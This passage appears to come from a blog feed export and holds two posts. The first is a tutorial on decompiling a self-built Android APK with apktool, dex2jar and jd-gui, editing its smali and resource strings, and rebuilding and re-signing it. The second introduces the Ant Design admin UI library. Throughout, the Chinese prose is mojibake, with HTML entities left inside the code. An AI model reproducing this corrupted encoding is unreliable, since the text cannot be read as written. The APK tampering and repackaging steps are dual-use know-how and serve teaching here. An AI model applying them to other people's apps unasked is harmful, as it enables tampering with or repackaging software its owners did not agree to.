MainActivity.javapublic class MainActivity extends Activity &#123;    @Override    protected void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        TextView text = (TextView)findViewById(R.id.text);        text.setText(&quot;Taiwan No1&quot;);    &#125;&#125;

activity_main.xml&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    android:layout_width=&quot;match_parent&quot;    android:orientation=&quot;vertical&quot;    android:layout_height=&quot;match_parent&quot;&gt;    &lt;TextView        android:text=&quot;@string/hello_world&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot; /&gt;    &lt;TextView        android:id=&quot;@+id/text&quot;        android:layout_width=&quot;wrap_content&quot;        android:layout_height=&quot;wrap_content&quot; /&gt;&lt;/LinearLayout&gt;

å®‰è£åˆ°æ‰‹æ©Ÿä¸Šä¹‹å¾Œï¼Œæœƒçœ‹åˆ°é€™æ¨£çš„ç•«é¢ï¼š

å¯¦éš›å‹•æ‰‹å¥½ï¼Œé€™å€‹å°±æ˜¯æˆ‘å€‘è¦æ‹¿ä¾†æ¸¬è©¦çš„ apk äº†ï¼æ¥è‘—ä½ éœ€è¦ä¸€äº›éå¸¸å¥½ç”¨çš„å·¥å…·ï¼š

apktool
jd-gui
dex2jar

å¦‚ä½•å®‰è£å°±ä¸å†è´…è¿°äº†ï¼Œè®€è€…å€‘å¯ä»¥åƒè€ƒçœ‹çœ‹æ–‡ä»¶æˆ–æ˜¯ä¸Šç¶²æœå°‹ä¸€ä¸‹å°±æœƒæœ‰ä¸€å †è§£ç­”ï½apktoolæ˜¯æ‹¿ä¾†æŠŠ apk æ‹†é–‹ç”¨çš„ï¼Œå¯ä»¥åç·¨è­¯ apk ä¹‹å¾Œï¼Œçœ‹åˆ° smali æª”æ¡ˆè·Ÿ resourcedex2jarå¯ä»¥æŠŠ apk è½‰æˆ jarï¼Œå†ç”¨jd-guiæª¢è¦– java code
æ¥è‘—æˆ‘å€‘é–‹å•Ÿ terminalï¼Œåˆ°å‰›å‰›é‚£å€‹ç¤ºç¯„ apk çš„ç›®éŒ„åº•ä¸‹ï¼ŒåŸ·è¡Œapktool d APKNAME.apk
åŸ·è¡Œä»¥å¾Œï¼Œæœƒè‡ªå‹•ç”Ÿæˆä¸€å€‹APKNAMEçš„è³‡æ–™å¤¾ï¼Œè£¡é¢å°±æ˜¯åç·¨è­¯å‡ºä¾†çš„æ±è¥¿äº†ã€‚
.â”œâ”€â”€ AndroidManifest.xmlâ”œâ”€â”€ apktool.ymlâ”œâ”€â”€ originalâ”œâ”€â”€ resâ””â”€â”€ smali

å…¶ä¸­æ¯”è¼ƒå€¼å¾—è¬›çš„æ˜¯smalié€™å€‹è³‡æ–™å¤¾ï¼Œå…¶å¯¦é€™è£¡é¢å°±æ˜¯ä½ çš„ source codeï¼Œåªæ˜¯æ ¼å¼ä¸å¤ªä¸€æ¨£ã€‚ä½ å¯ä»¥åœ¨smalié€™è³‡æ–™å¤¾è£¡é¢æ‰¾åˆ°ä½ çš„MainActivity.javaï¼Œå…§å®¹å¦‚ä¸‹ï¼šï¼ˆè¦ºå¾—é•·å¾—å¾ˆå¥‡æ€ªæ˜¯å¾ˆæ­£å¸¸çš„äº‹ï¼Œä½†æ˜¯èªçœŸå¤šçœ‹å¹¾çœ¼ï¼Œä½ æœƒç™¼ç¾å…¶å¯¦æ²’é‚£éº¼é›£æ‡‚ï¼‰
MainActivity.java.class public Lapktest/huli/com/apkdecompile/MainActivity;.super Landroid/app/Activity;.source &quot;MainActivity.java&quot;# direct methods.method public constructor &lt;init&gt;()V    .locals 0    .prologue    .line 8    invoke-direct &#123;p0&#125;, Landroid/app/Activity;-&gt;&lt;init&gt;()V    return-void.end method# virtual methods.method protected onCreate(Landroid/os/Bundle;)V    .locals 2    .param p1, &quot;savedInstanceState&quot;    # Landroid/os/Bundle;    .prologue    .line 12    invoke-super &#123;p0, p1&#125;, Landroid/app/Activity;-&gt;onCreate(Landroid/os/Bundle;)V    .line 13    const v1, 0x7f040019    invoke-virtual &#123;p0, v1&#125;, Lapktest/huli/com/apkdecompile/MainActivity;-&gt;setContentView(I)V    .line 14    const v1, 0x7f0c0050    invoke-virtual &#123;p0, v1&#125;, Lapktest/huli/com/apkdecompile/MainActivity;-&gt;findViewById(I)Landroid/view/View;    move-result-object v0    check-cast v0, Landroid/widget/TextView;    .line 15    .local v0, &quot;text&quot;:Landroid/widget/TextView;    const-string v1, &quot;Taiwan No1&quot;    invoke-virtual &#123;v0, v1&#125;, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V    .line 16    return-void.end method

ä½ å¯ä»¥ä»”ç´°å°ç…§ä¸€ä¸‹å‰›å‰›è‡ªå·±å¯«çš„ java codeï¼Œæœƒç™¼ç¾åªæ˜¯æ›äº†ç¨®æ ¼å¼è€Œå·²ï¼š
setContentView(R.layout.activity_main);
å…¶å¯¦å°±ç­‰æ–¼
.line 13const v1, 0x7f040019invoke-virtual &#123;p0, v1&#125;, Lapktest/huli/com/apkdecompile/MainActivity;-&gt;setContentView(I)V

ä½ å¯èƒ½æœƒå¥½å¥‡ï¼Œé€™å€‹0x7f040019æ˜¯å“ªä¾†çš„ï¼Ÿäº‹å¯¦ä¸Šï¼Œä½ å¯ä»¥åœ¨res/values/public.xmlé€™å€‹æª”æ¡ˆè£¡é¢æ‰¾åˆ°ç­”æ¡ˆï¼š
&lt;public type=&quot;layout&quot; name=&quot;activity_main&quot; id=&quot;0x7f040019&quot; /&gt;

åˆ°é€™è£¡ï¼Œæ‡‰è©²å°±å¯ä»¥å¤§æ¦‚çŒœå‡º Android åœ¨ç·¨è­¯æ™‚å€™çš„æµç¨‹ï¼š

æŠŠæ‰€æœ‰è³‡æºæª”å£“ç¸®ã€è™•ç†ä¸¦ä¸”åŒ…åœ¨ä¸€èµ·ï¼Œç”¢ç”Ÿidèˆ‡è¨˜æ†¶é«”ä½ç½®å°ç…§è¡¨
æŠŠç¨‹å¼ç¢¼è£¡é¢æ‰€æœ‰çš„R.xx.xxxé€éå‰›å‰›ç”¢ç”Ÿçš„è¡¨ï¼Œæ›æˆå¯¦éš›çš„è¨˜æ†¶é«”ä½ç½®
æŠŠ java code è®Šæˆ smali codeï¼ˆæœ‰é»åƒæŠŠ C è®Šæˆçµ„åˆèªè¨€çš„ç¨‹å¼ç¢¼é‚£æ¨£ï¼‰

ä¿®æ”¹åœ¨å‰›å‰›çš„smaliè£¡é¢ï¼Œæœ‰é€™éº¼ä¸€æ®µï¼š
.line 15.local v0, &quot;text&quot;:Landroid/widget/TextView;const-string v1, &quot;Taiwan No1&quot;invoke-virtual &#123;v0, v1&#125;, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V

è®“æˆ‘å€‘æŠŠTaiwan No1æ›æˆT@iw@n n0!ã€‚é‚„è¨˜å¾—å¦ä¸€å€‹TextViewæœ‰ç”¨åˆ°R.string.hello_worldå—ï¼Ÿåœ¨res/values/strings.xmlè£¡é¢ï¼Œå¯ä»¥æ‰¾åˆ°é€™ä¸€ä¸²çš„å®šç¾©ï¼š
&lt;string name=&quot;hello_world&quot;&gt;Hello world!&lt;/string&gt;

æ”¹æˆï¼š
&lt;string name=&quot;hello_world&quot;&gt;HELLO WORLD&lt;/string&gt;

ç¢ºå®šéƒ½æœ‰æ”¹å®Œä»¥å¾Œï¼Œå°±å¯ä»¥æŠŠé€™äº›ç¨‹å¼ç¢¼å†åº¦ã€Œçµ„è£ã€å›å»ã€‚é‚„è¨˜å¾—å‰›å‰›åç·¨è­¯çš„æŒ‡ä»¤å—ï¼Ÿapktool d APK_NAME.apké€™é‚Šçš„då°±æ˜¯decompileçš„æ„æ€ï¼Œæ‰€ä»¥å¦‚æœè¦é€†å‘çµ„è£å›å»ï¼Œå°±æ˜¯bï¼Œbuildã€‚
apktool b APK_NAME
åŸ·è¡Œå®Œä¹‹å¾Œå¯ä»¥åœ¨APK_NAME/distä¸‹é¢æ‰¾åˆ°ä¸€å€‹ apkã€‚ä½†è¦æ³¨æ„çš„æ˜¯é€™å€‹ apk é‚„æ²’æœ‰è¢« sign éï¼Œå› æ­¤ç„¡æ³•å®‰è£ã€‚å¯ä»¥éš¨ä¾¿ç”Ÿæˆä¸€å€‹ keystore æˆ–æ˜¯æ‰¾ç¾æˆçš„ä¾†ç°½ç½²ã€‚jarsigner -verbose -digestalg SHA1 -keystore ~/KEY.keystore APK_NAME.apk KEY_ALIAS
å®‰è£å®Œä»¥å¾Œå°±æœƒçœ‹åˆ°é€™æ¨£çš„ç•«é¢ï¼š

æ²’éŒ¯ï¼å°±æ˜¯é€™éº¼ç°¡å–®ï¼Œä¸€å€‹ apk å°±é€™æ¨£è¢«ä¿®æ”¹äº†ï¼
å¯æ˜¯smaliçš„ç¨‹å¼ç¢¼ä¸å¥½æ‡‚ï¼Œèƒ½ä¸èƒ½ç›´æ¥çœ‹åˆ° java codeå‘¢ï¼Ÿé€™æ™‚å€™å‰›å‰›æ¨è–¦çš„å·¥å…·dex2jarèˆ‡jd-guiå°±æ´¾ä¸Šç”¨å ´äº†å‰è€…å¯ä»¥æŠŠ apk è®Šæˆ jarï¼Œå¾Œè€…å¯ä»¥é–‹å•Ÿä¸€å€‹ jar ä¸¦ä¸”é¡¯ç¤º java codeå…©å€‹çµ„åˆåœ¨ä¸€èµ·ï¼Œå°±å¯ä»¥ç›´æ¥çœ‹åˆ°åŸæœ¬çš„ç¨‹å¼ç¢¼äº†
dex2jarä¸‹è¼‰ä¸‹ä¾†ä¹‹å¾Œæœƒæœ‰ä¸€å †çš„ shell scriptï¼Œdex2jarå°±æ˜¯æˆ‘å€‘æƒ³è¦çš„é‚£å€‹./d2j-dex2jar.sh app.apkåŸ·è¡Œå®Œä¹‹å¾Œæœƒæœ‰ä¸€å€‹ jarï¼Œç”¨ jd-gui æ‰“é–‹ï¼Œæœƒçœ‹åˆ°ä½ çš„ç¨‹å¼ç¢¼ä¸€è¦½ç„¡éºï¼š

ç¸½çµæ²’æ¥è§¸éåç·¨è­¯çš„äººå¯èƒ½æœƒå¾ˆé©šè¨ï¼šä»€éº¼ï¼è¦æ”¹æ‰ä¸€å€‹ apk å±…ç„¶é€™éº¼ç°¡å–®ï¼æ²’éŒ¯ï¼Œå°±æ˜¯é€™éº¼ç°¡å–®ï¼Œè€Œä¸”é€™åªæ˜¯ä¸€å€‹å¾ˆåŸºæœ¬çš„ç¯„ä¾‹è€Œå·²ã€‚äº‹å¯¦ä¸Šï¼Œä½ æƒ³è¦åŠ å…¥æ–°çš„ç¨‹å¼ç¢¼ã€åŠ å…¥æ–°çš„è³‡æºï¼ˆåœ–ç‰‡ã€è²éŸ³ç­‰ç­‰ï¼‰ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œä½ ä¸åªå¯ä»¥ä¿®æ”¹ï¼Œé‚„å¯ä»¥æ“´å……åŸæœ¬çš„ apkï¼
ä½†ä¹Ÿæœ‰äº›æ–¹æ³•å¯ä»¥é˜²æ­¢ä¸è‚–äººå£«åç·¨è­¯ apkï¼Œä¾‹å¦‚èªªåŠ æ®¼ã€æ··æ·†ã€å‹•æ…‹è¼‰å…¥ç­‰ï¼Œé—œæ–¼é€™äº›æ–¹æ³•æˆ‘å€‘ä¸‹æ¬¡æœ‰æ©Ÿæœƒå†ä»‹ç´¹çµ¦å¤§å®¶å›‰ï¼
å»¶ä¼¸é–±è®€
Android åç·¨è­¯èˆ‡é˜²æ­¢è¢«åç·¨è­¯
[Android] ç¨‹å¼ç¢¼æ··æ·†(ProGuard)èˆ‡åçµ„è­¯
[Android] åçµ„è­¯ ç ´è§£Androidçš„apkå®‰è£æª”
åç¼–è¯‘çš„å¸¸ç”¨å·¥å…·ä¸ä½¿ç”¨æ–¹æ³•
Smaliâ€“Dalvikè™šæ‹ŸæœºæŒ‡ä»¤è¯­è¨€â€“&gt;ã€android_smaliè¯­æ³•å­¦ä¹ ä¸€ã€‘
androidåç¼–è¯‘-smaliè¯­æ³•

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>Mobile</tag>
        <tag>Android</tag>
        <tag>Decompile</tag>
        <tag>Apktool</tag>
        <tag>Smali</tag>
        <tag>Dex2jar</tag>
        <tag>è¡Œå‹•ç¶²è·¯</tag>
        <tag>åç·¨è­¯</tag>
        <tag>APK</tag>
      </tags>
  </entry>
  <entry>
    <title>æ‰“é€ å¾Œå°ç®¡ç†ç³»çµ±çš„å¥½å¹«æ‰‹ï¼šAnt Design</title>
    <url>/2018/04/28/antd-and-admin-website/</url>
    <content><![CDATA[å‰è¨€å¾ˆå¤šå…¬å¸éƒ½æœƒéœ€è¦ä¸€å€‹åƒ…ä¾›å…§éƒ¨ä½¿ç”¨çš„å¾Œå°ç³»çµ±ï¼Œä¾†ç®¡ç†å…¬å¸å…§çš„ä¸€äº›äº‹æƒ…ã€‚ä¸éä¹Ÿå› ç‚ºæ˜¯å…¬å¸å…§çš„ç”¢å“ï¼ŒæŠ•å…¥çš„è³‡æºæ¯”èµ·çµ¦å¤–é¢ä½¿ç”¨è€…çš„ç”¢å“å¾€å¾€éƒ½ä¾†å¾—è¼ƒå°‘ï¼Œèº«ç‚ºä¸€å€‹å‰ç«¯å·¥ç¨‹å¸«ï¼Œä½ å¾ˆæœ‰å¯èƒ½å¿…é ˆèº«å…¼è¨­è¨ˆï¼Œæ±ºå®šæ•´å€‹ UI çš„é•·ç›¸ã€‚
é€™æ™‚å€™å‘¢ï¼Œå¦‚æœèƒ½æ‰¾åˆ°ä¸€å¥—ç¾æˆçš„ Library ç•¶ç„¶å°±æœ€æ£’äº†ï¼
é€™ç¯‡ä¸»è¦æœƒä»‹ç´¹ç”±èèŸ»é‡‘æœé–‹æºå‡ºä¾†çš„ Ant Design é€™å¥— UI çš„ Libraryï¼Œä¸¦ä¸”è®“å¤§å®¶çœ‹çœ‹å¹¾å€‹ç¯„ä¾‹ã€‚
å¾Œå°ç³»çµ±çš„ UIåœ¨æˆ‘èªè­˜ Ant Design ä¹‹å‰ï¼Œæˆ‘éƒ½æ˜¯ç”¨é€™å¥—å«åš AdminLTEç•¶ä½œæ¨¡æ¿ä¾†åˆ» UIã€‚æ‰¾é€™ç¨®ç¾æˆçš„æ¨¡æ¿å¥½è™•é¡¯è€Œæ˜“è¦‹ï¼Œé‚£å°±æ˜¯å¾ˆå¤šæ™‚å€™ä½ åªè¦ä¸€ç›´è¤‡è£½è²¼ä¸Šå°±å¥½ï¼Œå¯ä»¥çœç•¥å¤§éƒ¨ä»½çš„ CSSï¼Œå¤§æ¦‚åªæœ‰ 20% éœ€è¦è‡ªå·±å¯«ã€‚
é™¤æ­¤ä¹‹å¤–å‘¢ï¼Œä¹Ÿèƒ½åœ¨æ²’æœ‰è¨­è¨ˆå¸«çš„å¹«åŠ©ä¸‹å°±åˆ»å‡ºé¢¨æ ¼ä¸€è‡´çš„ä»‹é¢ã€‚

é€™ä¸€å¥—æ˜¯å°ˆé–€çµ¦å¾Œå°ç³»çµ±ç”¨çš„ï¼Œå¦‚æœä½ è¦æ‰¾çš„åªæ˜¯ UI Libraryï¼Œæˆ–è¨± Bootstrap è·Ÿ Material-UI å°±å¾ˆå¤ ç”¨äº†ã€‚
åœ¨é–‹å§‹æƒ³èªªè¦ç”¨å“ªä¸€å¥— Library ä¹‹å‰ï¼Œå¯ä»¥å…ˆå•è‡ªå·±å…©å€‹å•é¡Œï¼š


å°æ–¼å¾Œå°ç³»çµ±ï¼Œæˆ‘éœ€è¦å“ªäº›å…ƒä»¶ï¼Ÿ
æœ€ä¸»è¦çš„åŠŸèƒ½æœƒæ˜¯ä»€éº¼ï¼Ÿ


ç¬¬ä¸€é»çš„è©±å¾ˆå®¹æ˜“ï¼Œå…¶å¯¦æˆ‘å€‘å¯ä»¥ç°¡å–®æ­¸ç´å‡ºä»¥ä¸‹å¹¾ç¨®ï¼š

åŸºæœ¬ Layout å…ƒä»¶èˆ‡ç¶²æ ¼ç³»çµ±
åŸºæœ¬å…ƒä»¶ï¼Œåƒ Buttonã€Iconã€Listã€Card ç­‰ç­‰
è¡¨å–®å…ƒä»¶ï¼Œåƒ Inputã€Formã€Selectã€Checkbox ç­‰ç­‰
è¡¨æ ¼

ç¬¬äºŒé»çš„è©±å‘¢ï¼Œä»¥æˆ‘è‡ªå·±æ¥è§¸éçš„å¾Œå°ç³»çµ±ä¾†èªªï¼Œæˆ‘èªç‚ºå¾Œå°ç³»çµ±æœ€éœ€è¦çš„æ˜¯ä»¥ä¸‹å…©é»ï¼š

éœ€è¦æ”¯æ´è¤‡é›œçš„è¡¨å–®ï¼Œæä¾›è¨±å¤šä¸åŒçš„ Component åƒæ˜¯ AutoCompleteã€DatePickerã€TimePickerã€Rating ç­‰ç­‰
éœ€è¦æœ‰å¼·å¤§çš„ Data Tableï¼Œå¯ä»¥æ’åºã€ç¯©é¸ã€æœå°‹ã€åˆ†é æˆ–ç”šè‡³æ˜¯ Inline Edit

å¦‚æœä½ æŠŠä¸Šé¢å…©é»è€ƒæ…®é€²ä¾†çš„è©±ï¼Œç¾æˆçš„ UI Library å¤§æ¦‚éƒ½è¢«æ’é™¤äº†ã€‚ä¸éå…¶å¯¦ä¹Ÿå¾ˆåˆç†ï¼Œå› ç‚ºä½ æœƒç™¼ç¾æˆ‘å€‘è¦çš„æ±è¥¿å…¶å¯¦åŒ…å«ã€ŒåŠŸèƒ½é¢ã€ï¼Œä¾‹å¦‚èªª Data Tableï¼Œé€™äº›éƒ½æ˜¯ç´” UI çš„ Library ä¸æœƒå»æ”¯æ´åˆ°çš„ï¼Œä½ å¿…é ˆè‡ªå·±å¦å¤–å†æ‰¾ Library æ‰èƒ½å¯¦ç¾ã€‚
ç¸½çµä»¥ä¸Šå¹¾é»ï¼Œæˆ‘ç†æƒ³ä¸­çš„ Library å¤§æ¦‚é•·é€™æ¨£ï¼š

è¦æ”¯æ´åŠŸèƒ½é¢ï¼Œä¸åªæœ‰ UI
UI è¦æ¼‚äº®
æœ€å¥½èƒ½æœ‰ React å…ƒä»¶ï¼ˆå€‹äººåå¥½ï¼‰

æœ‰é€™æ¨£çš„ Library å—ï¼Ÿæœ‰ï¼Œå°±æ˜¯ç­‰ç­‰è¦ä»‹ç´¹çš„é€™å¥—ã€‚
Ant Design
Ant Design æ˜¯ä¸€å¥—ç”±ä¸­åœ‹çŸ¥åç¶²è·¯å…¬å¸èèŸ»é‡‘æœæ‰€é–‹æºå‡ºä¾†çš„ UI Libraryï¼Œä½†å®ƒè·Ÿå…¶ä»–å¥—ä¸åŒçš„é»åœ¨æ–¼å®ƒä¸åªæ˜¯ä¸€å¥— UI Libraryï¼Œé‚„æä¾›äº†ä¸€äº›è¨­è¨ˆèªè¨€ï¼ˆDesign Languageï¼‰ï¼Œç°¡å–®ä¾†è¬›å°±æ˜¯çµ¦äº†ä½ ä¸€ä»½æŒ‡å—ï¼Œè·Ÿä½ èªªä½ é‡åˆ°ä»€éº¼æƒ…å½¢çš„æ™‚å€™æ‡‰è©²æ€éº¼åšï¼Œä»¥åŠæ¯å€‹è¨­è¨ˆèƒŒå¾Œä»£è¡¨çš„æ„ç¾©ã€‚
é™¤æ­¤ä¹‹å¤–å‘¢ï¼Œæˆ‘è¦ºå¾— Ant Design çš„å„ªé»é‚„æœ‰ä»¥ä¸‹å¹¾é …ï¼š

æ”¯æ´å„ç¨®å¸¸ç”¨çµ„ä»¶ï¼Œé€£å¾ˆä¸å¸¸è¦‹çš„éƒ½æœ‰
æœ‰æä¾› React Componentï¼Œä½¿ç”¨èµ·ä¾†å¾ˆæ–¹ä¾¿
Table åŠŸèƒ½å¼·å¤§ï¼Œæ”¯æ´åˆ†é ã€ç¯©é¸è·Ÿæ’åº
ä¸­è‹±æ–‡æ–‡ä»¶é½Šå…¨ï¼Œè¦è·Ÿå¤–åœ‹åŒäº‹å…±äº‹ä¹Ÿæ²’å•é¡Œ
ç”±èèŸ»é‡‘æœç¶­è­·ï¼Œæ›´æ–°é »ç¹ç©©å®šåº¦é«˜

é€™é‚Šæœ‰ä¸€å€‹é–‹æºçš„ demoï¼Œå°±æ˜¯åŸºæ–¼ Ant Design ä¾†é–‹ç™¼çš„ï¼šzuiidea&#x2F;antd-adminï¼š

æˆ‘è‡ªå·±è¦ºå¾—ä»‹é¢å¾ˆ OKï¼Œçœ‹èµ·ä¾†ä¹Ÿå¾ˆèˆ’æœã€‚æœ€é‡è¦çš„æ˜¯ä½ æœƒç”¨åˆ°çš„ Component å®ƒåŸºæœ¬éƒ½å¯¦ä½œäº†ï¼Œå¾ˆå°‘æ™‚å€™éœ€è¦è‡ªå·±æ‰‹å¯« CSSã€‚
ä»¥ä¸‹æ˜¯å®ƒæ‰€æœ‰çš„ Componentã€‚
å¸¸ç”¨åŠæ’ç‰ˆ
Button æŒ‰éˆ•
Icon åœ–æ¨™
Grid ç¶²æ ¼
Layout ä½ˆå±€

å°è¦½
Affix å›ºé‡˜
Breadcrumb éºµåŒ…å±‘
Dropdown ä¸‹æ‹‰é¸å–®
Menu é¸å–®
Pagination åˆ†é 
Steps æ­¥é©Ÿæ¢

Data Entry
AutoComplete è‡ªå‹•å®Œæˆ
Cascader å±¤ç´šé¸æ“‡
Checkbox å¤šé¸
DatePicker æ—¥æœŸé¸æ“‡
Form è¡¨å–®
Input è¼¸å…¥
InputNumber
Mention æåŠ
Rate è©•åˆ†
Radio å¤šé¸
Slider æ»‘å‹•æ¢
Switch é–‹é—œ
TreeSelect æ¨¹é¸æ“‡
TimePicker æ™‚é–“é¸æ“‡
Transfer ç©¿æ¢­æ¡†
Upload ä¸Šå‚³

Data Display
Avatar é ­åƒ
Badge å¾½ç« 
Calendar æ—¥æ›†
Card å¡ç‰‡
Carousel è·‘é¦¬ç‡ˆ
Collapse æŠ˜ç–Š
List åˆ—è¡¨
Popover æ°£æ³¡å¡ç‰‡
Tooltip æ–‡å­—æç¤º
Table è¡¨æ ¼
Tabs åˆ†é 
Tag æ¨™ç±¤
Timeline æ™‚é–“è»¸
Tree æ¨¹

Feedback
Alert è­¦å‘Šæç¤º
Modal å°è©±æ¡†
Message å…¨å±€æç¤º
Notification é€šçŸ¥
Progress é€²åº¦æ¢
Popconfirm æ°£æ³¡ç¢ºèª
Spin è¼‰å…¥ä¸­

å…¶ä»–
Anchor éŒ¨é»
BackTop å›åˆ°é ‚éƒ¨
Divider åˆ†éš”ç·š
LocaleProvider åœ‹éš›åŒ–

æä¾›äº†å°‡è¿‘ 50 ç¨®çš„çµ„ä»¶ä»»ä½ ä½¿ç”¨ï¼æ‰€ä»¥æˆ‘æ‰èªª Ant Design çš„æ¶µè“‹ç¯„åœçœŸçš„å¾ˆå¤§ï¼Œæ‰€æœ‰å¸¸ç”¨çš„ Component éƒ½æ‰¾å¾—åˆ°ï¼Œæœ‰äº›æ¯”è¼ƒå°‘è¦‹çš„ä¹Ÿç›´æ¥é™„åœ¨è£¡é¢äº†ã€‚
å†è®“å¤§å®¶çœ‹å¹¾å¼µæˆªåœ–ï¼š
åœ¨æ›´æ”¹&#x2F;æ–°å¢è³‡æ–™æ™‚å¯ä»¥è·³å‡º Modal å–ä»£æ‰æ›é ï¼ˆå¦‚æœå…§å®¹ä¸å¤šçš„è©±ï¼‰ï¼š
çµåˆå…¶ä»– Component åšå‡ºä¸€å€‹é¡å¤–çš„ Filterï¼š
åŸºæœ¬è¡¨å–®ä»¥åŠè¡¨å–®é©—è­‰ï¼š
å¯¦ä½œä¸Šè¦æ³¨æ„çš„åœ°æ–¹é¦–å…ˆå‘¢ï¼Œç¬¬ä¸€å€‹æ˜¯è¡¨å–®çš„æŒ‘é¸ï¼Œå› ç‚ºå¾Œå°ç³»çµ±è£¡é¢æœƒæœ‰è¶…ç´šå¤šè¡¨å–®ï¼Œæ‰€ä»¥æ±ºå®šè¦ç”¨å“ªä¸€å€‹ Library æ˜¯å¾ˆé‡è¦çš„ã€‚
Ant Design æœ‰æä¾›è‡ªå·±çš„ Form HOCï¼Œè·Ÿ Ant Design å…¶ä»–çµ„ä»¶çš„æ•´åˆå¾ˆä¸éŒ¯ã€‚è¬›åˆ°è¡¨å–®ä¸å¾—ä¸æçš„ Redux Form å‰‡æ˜¯è‡ªç”±åº¦é«˜äº†è¨±å¤šï¼Œå¯ä»¥è·Ÿä»»æ„çš„ UI Library äº’ç›¸æ­é…ä½¿ç”¨ã€‚
åŸºæ–¼è‡ªç”±åº¦é«˜ä»¥åŠåŠŸèƒ½å®Œæ•´é€™å…©é»ï¼Œæˆ‘å€‘æœ€å¾Œé¸æ“‡äº† Redux Form ä¾†ç•¶ä½œè™•ç†è¡¨å–®ç›¸é—œçš„ Libraryã€‚
ç¬¬äºŒé»è¦æ³¨æ„çš„æ˜¯ï¼Œå¯ä»¥åœ¨ Ant Design è·ŸçœŸçš„ App ä¹‹é–“æ”¾ä¸€å±¤ä¸­é–“å±¤ï¼Œæˆ‘ç¨±ä¹‹ç‚º Component Wrapperã€‚

ç‚ºä»€éº¼è¦ç”¨é€™ä¸€å±¤ï¼Ÿä¸æ˜¯å¤šæ­¤ä¸€èˆ‰å—ï¼Ÿ
é€™ä¸€å±¤çš„ç›®çš„æ˜¯æŠŠ App è·Ÿ UI Library çš„ç›¸ä¾æ€§é™ä½ï¼Œèˆ‰å€‹ä¾‹å­ä¾†èªªå¥½äº†ï¼Œå‡è¨­ç¾åœ¨ä½ æ‰€æœ‰é é¢éƒ½ç›´æ¥å¼•ç”¨ antd çš„å…ƒä»¶ï¼Œç„¶å¾Œä¸‹ä¸€å€‹ç‰ˆæœ¬ä¸­ antd æŠŠæŸå€‹ props å¾ text æ”¹æˆ valueï¼Œä½ è©²æ€éº¼è¾¦å‘¢ï¼Ÿ
é‚„èƒ½æ€éº¼è¾¦ï¼Œå°±æ˜¯æœå°‹ç„¶å¾Œå–ä»£å›‰ï¼Œä¸€å€‹å€‹æª¢æŸ¥æœ‰æ²’æœ‰æ²’æ”¹åˆ°çš„æˆ–æ˜¯ä¸è©²æ”¹çš„ã€‚
ä½†å‡è¨­æˆ‘å€‘ä¸­é–“å¤šäº†ä¸€å±¤ Wrapperï¼Œæˆ‘å€‘å°±èƒ½åœ¨é€™ä¸€å±¤è£¡é¢è‡ªå‹•æŠŠé€™å€‹ props æ›æ‰ï¼Œçœæ‰å¾ˆå¤šéº»ç…©ã€‚
åˆæˆ–æ˜¯åŸæœ¬ antd çš„ Modal ä¸¦æ²’æœ‰æ”¯æ´ loading é€™å€‹ç‹€æ…‹ï¼Œåªèƒ½æ­é… Spin è‡ªå·±å¯¦ç¾ï¼Œä½†å¦‚æœæˆ‘å€‘æœ‰äº†ä¸­é–“é€™å±¤ï¼Œå°±å¯ä»¥åœ¨ä¸­é–“ä¾†å¯¦ä½œï¼Œè€Œä¸æ˜¯åœ¨ App çš„æŸå¹¾å€‹åœ°æ–¹ã€‚
æ‰€ä»¥ç¨‹å¼ç¢¼æœƒé•·çš„åƒé€™æ¨£ï¼Œæˆ‘å€‘è‡ªå·±åŠ äº†ä¸€å€‹isLoadingçš„ propsï¼š

æˆ‘é‚„æ»¿å–œæ­¡é€™å€‹ ideaï¼ŒæŠŠåŸæœ¬ antd çš„å…ƒä»¶éƒ½å…ˆåŒ…èµ·ä¾†ï¼Œé€™æ¨£å¦‚æœä½ æƒ³åšä»€éº¼æ”¹è®Šï¼Œå¯ä»¥åœ¨ä¸­é–“é‚£å±¤æ”¹ï¼Œæ”¹ä¸€å€‹åœ°æ–¹å°±èƒ½å¤ å½±éŸ¿åˆ°å…¨ Appã€‚
çµè«–è‡ªå¾æˆ‘å€‘å…§éƒ¨ç³»çµ±æ”¹ç”¨ Ant Design ä¾†é–‹ç™¼ä¹‹å¾Œï¼Œæ•ˆç‡ä¸Šå¢å¿«äº†å¾ˆå¤šï¼ŒUI ä¹Ÿçœ‹èµ·ä¾†èˆ’æœå¾ˆå¤šã€‚èº«ç‚ºä¸€å€‹è¢«æŒ‡æ´¾è¨­è¨ˆå¸«ä»»å‹™çš„å·¥ç¨‹å¸«ï¼Œä¹Ÿè¦ºå¾—è¼•é¬†è¨±å¤šã€‚ä½ åªè¦ç”¨ä»–å€‘çš„ Componentï¼Œå°±å¯ä»¥ä¿è­‰ UI çš„ä¸€è‡´æ€§ã€‚
è€Œä¸”ç•¶ä½ åœ¨ UI&#x2F;UX ä¸Šæœ‰ç–‘å•æ™‚ï¼Œé‚„å¯ä»¥å»ç¿»ä»–å€‘çš„æŒ‡å—ï¼Œæœ‰æ™‚å€™æœƒå¯«èªªä»–å€‘æ¨è–¦æ‡‰è©²è¦æ€éº¼è™•ç†æœƒæ¯”è¼ƒå¥½ã€‚
